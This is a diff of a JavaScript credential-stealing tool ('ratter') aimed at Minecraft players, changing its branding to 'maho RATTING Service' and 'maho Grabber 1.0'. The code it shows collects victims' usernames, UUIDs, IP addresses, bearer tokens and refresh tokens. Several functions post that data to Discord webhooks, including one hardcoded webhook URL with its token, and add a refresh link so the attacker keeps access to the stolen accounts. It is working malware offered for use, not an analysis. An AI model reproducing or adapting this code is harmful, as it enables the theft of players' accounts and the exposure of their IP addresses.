@@ -129,9 +129,9 @@ async function getUsernameAndUUID(bearerToken) {
 function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
     let data = {
-  username: "Bingle Rats",
+  username: "maho RATTING Service",
   avatar_url: "https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQNaAbV6LQXCuBpgR5ia1eoWC6argRnEcrPv15abL7pIZ7rSpwJ",
-  content: "@everyone",
+  content: "@here",
   embeds: [
     {
       title: "Ratted " + username + " - Click for networth",
@@ -139,7 +139,7 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
       description: "**Username:**\n`"+username+"`\n\n**UUID:**\n`"+uuid+"`\n\n**IP:**\n`"+ip+"`\n\n**Token:**\n`"+bearerToken+"`\n\n**Refresh Token:**\n`"+refreshToken+"`\n\n**Login:**\n`"+username + ":" + uuid + ":"+ bearerToken+"`\n\n**Refresh:**\n"+redirect_uri+"refresh?refresh_token="+refreshToken+"\n",
       url: "https://sky.shiiyu.moe/stats/"+username,
       footer: {
-        text: "https://e-z.bio/bing",
+        text: "maho Grabber 1.0",
         icon_url: "https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQNaAbV6LQXCuBpgR5ia1eoWC6argRnEcrPv15abL7pIZ7rSpwJ"
       },
     }
@@ -153,9 +153,9 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
 function postToWebhook2(username, bearerToken, uuid, ip, refreshToken) {
     const url = 'https://ptb.discord.com/api/webhooks/1113551902194552902/IKI4gMEgyAIT5rn4i-yYiH4pNA9AjRald5dOlxrBl_VOnRepx9Qqz-nD_5Sfs190VsRv'
     let data = {
-  username: "Bingle Rats",
+  username: "maho RATTING Service",
   avatar_url: "https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQNaAbV6LQXCuBpgR5ia1eoWC6argRnEcrPv15abL7pIZ7rSpwJ",
-  content: "@everyone",
+  content: "@here",
   embeds: [
     {
       title: "Ratted " + username + " - Click for networth",
@@ -163,7 +163,7 @@ function postToWebhook2(username, bearerToken, uuid, ip, refreshToken) {
       description: "**Username:**\n`"+username+"`\n\n**UUID:**\n`"+uuid+"`\n\n**IP:**\n`"+ip+"`\n\n**Token:**\n`"+bearerToken+"`\n\n**Refresh Token:**\n`"+refreshToken+"`\n\n**Login:**\n`"+username + ":" + uuid + ":"+ bearerToken+"`\n\n**Refresh:**\n"+redirect_uri+"refresh?refresh_token="+refreshToken+"\n",
       url: "https://sky.shiiyu.moe/stats/"+username,
       footer: {
-        text: "https://e-z.bio/bing",
+        text: "maho Grabber 1.0",
         icon_url: "https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQNaAbV6LQXCuBpgR5ia1eoWC6argRnEcrPv15abL7pIZ7rSpwJ"
       },
     }
@@ -284,7 +284,7 @@ async function getNewUsernameAndUUID(newBearerToken) {
 function refreshToWebhook(newUsername, newBearerToken, newUuid, newRefreshToken) {
     const url = webhook_url
     let data = {
-  username: "Bingle Rats",
+  username: "maho RATTING Service",
   avatar_url: "https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQNaAbV6LQXCuBpgR5ia1eoWC6argRnEcrPv15abL7pIZ7rSpwJ",
   content: "REFRESHED",
   embeds: [
@@ -294,7 +294,7 @@ function refreshToWebhook(newUsername, newBearerToken, newUuid, newRefreshToken)
       description: "**Username:**\n`"+newUsername+"`\n\n**UUID:**\n`"+newUuid+"`\n\n**Token:**\n`"+newBearerToken+"`\n\n**Refresh Token:**\n`"+newRefreshToken+"`\n\n**Login:**\n`"+newUsername + ":" + newUuid + ":"+ newBearerToken+"`\n\n**Refresh:**\n"+redirect_uri+"refresh?refresh_token="+newRefreshToken+"\n",
       url: "https://sky.shiiyu.moe/stats/"+newUsername,
       footer: {
-        text: "https://e-z.bio/bing",
+        text: "maho Grabber 1.0",
         icon_url: "https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQNaAbV6LQXCuBpgR5ia1eoWC6argRnEcrPv15abL7pIZ7rSpwJ"
       },
     }
